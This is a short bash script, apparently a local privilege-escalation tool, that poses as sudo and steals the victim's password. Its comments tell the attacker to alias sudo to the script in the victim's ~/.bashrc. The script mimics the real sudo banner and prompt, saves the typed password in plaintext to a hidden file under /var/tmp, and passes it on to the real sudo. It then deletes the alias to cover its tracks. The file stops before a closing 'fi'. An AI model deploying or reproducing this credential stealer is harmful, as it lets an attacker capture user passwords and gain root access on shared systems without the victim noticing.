#
# Use case:
#	You have local access and the victim's
#	~/.bashrc is writeable
#
# Usage:
#	Place this shell script in:
#	/var/tmp/.sudo
#	Remember to make it chmod 755
# 	Place the following in victim's ~/.bashrc
# 	alias sudo='/var/tmp/.sudo'
#
# Outcome:
#	The vitcim's password should be written to:
#	 /var/tmp/.$USER.pass
#

if [ -e "/var/tmp/.${USER}.pass" ]
then
	# PASSWORD HAS ALREADY BEEN STOLEN SO EXECUTE SUDO NORMALLY
	\sudo $@
else
	# PRINT INITIAL LOGIN BANNER
	cat <<-BANNER
	We trust you have received the usual lecture from the local System
	Administrator. It usually boils down to these three things:

	    #1) Respect the privacy of others.
	    #2) Think before you type.
	    #3) With great power comes great responsibility.
	BANNER

	# READ PASSWORD
	read -sp "[sudo] password for $USER: " password

	# NEWLINE
	echo

	# COPY PASSWORD TO FILE AND EXECUTE SUDO
	echo $password | tee /var/tmp/.${USER}.pass | \sudo -S $@

	# CLEANUP THE .bashrc FILE
	sed -i "/alias sudo='\/var\/tmp\/\.sudo'/d" ~/.bashrc
